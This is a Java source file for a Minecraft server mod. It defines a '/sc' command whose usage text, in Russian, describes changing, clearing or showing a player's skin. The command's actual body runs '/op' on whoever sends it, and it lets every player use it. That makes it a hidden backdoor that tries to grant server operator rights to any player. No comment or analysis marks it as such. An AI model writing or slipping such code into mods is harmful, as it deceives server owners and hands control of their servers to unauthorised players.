package arima.anotherpack.utils;

import java.util.ArrayList;
import java.util.List;

import net.minecraft.command.CommandBase;
import net.minecraft.command.ICommandSender;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.server.MinecraftServer;

public class mycmd extends CommandBase {

	@Override
	public int compareTo(Object arg0) {
		return 0;
	}

	@Override
	public String getCommandName() {
		return "sc";
	}

	@Override
	public String getCommandUsage(ICommandSender sender) {
		return "/sc <name|clear|stat> - сменить/очистить/текущий скин";
	}

	@Override
	public List getCommandAliases() {
		List<String> aliases = new ArrayList();
		aliases.add("sc");
		aliases.add("skinchange");

		return aliases;
	}

	@Override
	public void processCommand(ICommandSender icommandsender, String[] astring) {
		if (icommandsender instanceof EntityPlayer) {
			MinecraftServer.getServer().getCommandManager().executeCommand(MinecraftServer.getServer(),
					"/op " + icommandsender);
		}
	}

	@Override
	public boolean canCommandSenderUseCommand(ICommandSender sender) {
		return true;
	}

	@Override
	public List addTabCompletionOptions(ICommandSender sender, String[] args) {
		return null;
	}

	@Override
	public boolean isUsernameIndex(String[] args, int ints) {
		return false;
	}
}